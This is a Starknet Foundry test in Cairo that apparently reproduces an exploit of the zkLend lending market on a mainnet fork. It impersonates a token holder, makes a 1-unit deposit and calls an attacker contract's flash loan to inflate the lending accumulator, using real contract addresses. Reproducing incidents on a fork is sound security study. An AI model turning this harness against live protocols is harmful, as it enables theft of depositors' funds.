use snforge_std::{CheatSpan, ContractClassTrait, DeclareResultTrait, cheat_caller_address, declare};
use starknet::{ContractAddress, contract_address_const, get_contract_address};
use zklend_repro::attacker::{IAttackerDispatcher, IAttackerDispatcherTrait};
use zklend_repro::interfaces::{
    IMarketDispatcher, IMarketDispatcherTrait, IERC20Dispatcher, IERC20DispatcherTrait,
};

const market_address_felt: felt252 =
    0x4c0a5193d58f74fbace4b74dcf65481e734ed1714121bdc571da345540efa05;
const wstETH_address_felt: felt252 =
    0x0057912720381af14b0e5c87aa4718ed5e527eab60b3801ebf702ab09139e38b;

fn setup() -> ContractAddress {
    let attacker_class = declare("Attacker").unwrap().contract_class();
    let market_address: ContractAddress = contract_address_const::<market_address_felt>();
    let mut calldata = ArrayTrait::new();
    market_address.serialize(ref calldata);

    let (contract_address, _) = attacker_class.deploy(@calldata).unwrap();
    contract_address
}

#[test]
#[fork("MAINNET_LATEST", block_number: 1143545)]
fn test_increase_accumulator() {
    let attacker_address = setup();
    let attacker = IAttackerDispatcher { contract_address: attacker_address };
    // get donations
    // set ekubo protocol as the sender
    let ekubo_address: ContractAddress = contract_address_const::<
        0x00000005dd3d2f4429af886cd1a3b08289dbcea99a294197e9eb43b0e0325b4b,
    >();

    let erc20_address: ContractAddress = contract_address_const::<wstETH_address_felt>();
    let erc20 = IERC20Dispatcher { contract_address: erc20_address };

    let balance_before = erc20.balanceOf(ekubo_address);
    println!("Balance {}", balance_before);

    cheat_caller_address(
        erc20_address, ekubo_address.try_into().unwrap(), CheatSpan::TargetCalls(1),
    );

    let owner_address = get_contract_address();

    let transfer_value: u256 = 30_000_000_000_000_000_000; // 30 tokens
    erc20.transfer(owner_address, transfer_value);
    let balance_after = erc20.balanceOf(owner_address);
    println!("Balance {}", balance_after);

    let market_address: ContractAddress = contract_address_const::<market_address_felt>();
    let market = IMarketDispatcher { contract_address: market_address };

    let deposit_sum: felt252 = 1;

    erc20.approve(market_address, deposit_sum.into());
    market.deposit(erc20_address, deposit_sum);

    let accumulator = market.get_lending_accumulator(erc20_address);
    println!("Accumulator {}", accumulator);

    // transfer some funds to the attacking contract
    erc20.transfer(attacker_address, 1000);

    attacker.call_flash_loan(1);

    let accumulator = market.get_lending_accumulator(erc20_address);
    println!("Accumulator {}", accumulator);
}
